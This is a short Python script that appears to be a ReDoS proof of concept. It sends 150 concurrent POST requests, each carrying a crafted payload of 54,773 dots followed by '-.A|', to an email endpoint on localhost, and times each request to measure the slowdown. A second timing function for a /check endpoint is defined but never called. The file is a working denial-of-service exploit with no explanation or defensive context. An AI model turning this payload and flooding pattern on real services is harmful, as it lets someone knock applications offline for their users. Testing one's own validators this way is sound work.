import requests
import time
import concurrent.futures

def send_email_req():
    start_time = time.time()

    injection = '.' * 54773 + '-.A|'
    requests.post("http://localhost:8080/email", injection)

    end_time = time.time()
    duration = end_time - start_time

    print(f"EMAIL: The request took {duration} seconds.")


def send_check_request():
    start_time = time.time()

    requests.get("http://localhost:8080/check")

    end_time = time.time()
    duration = end_time - start_time

    print(f"CHECK: The request took {duration} seconds.")


# Total number of requests to send
total_requests = 150

# Use ThreadPoolExecutor to run multiple requests in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    # Store futures
    futures = []

    for i in range(1, total_requests + 1):
        future = executor.submit(send_email_req)
        futures.append(future)

    # Wait for all futures to complete and handle results/errors
    for future in concurrent.futures.as_completed(futures):
        try:
            result = future.result()
        except Exception as exc:
            print(f'Generated an exception: {exc}')